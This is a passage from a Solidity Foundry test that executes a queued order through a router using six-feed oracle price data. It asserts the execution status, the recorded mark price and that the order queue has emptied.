        bytes[] memory payload = _sixFeedUpdateData(price, true);
        uint256 executionFeeWei = pletherOracle.getOrderExecutionFee(payload);
        vm.deal(KEEPER, 10 ether);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result =
            router.executeOrder{value: executionFeeWei}(orderId, payload);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed),
            "public Router execution did not reach the Engine");
        assertEq(uint8(result.terminalReason), uint8(OrderV3Types.TerminalReason.Executed),
            "public Router produced unexpected terminal outcome");
        console2.log("actual six-feed executed mark", engine.lastMarkPrice());
        assertApproxEqAbs(engine.lastMarkPrice(), price, 50, "six-feed execution mark deviation");
        assertEq(router.nextExecuteId(), 0, "FIFO order must be removed");
        assertEq(router.pendingOrderCounts(trader), 0, "account queue must be empty");
    }
}

```

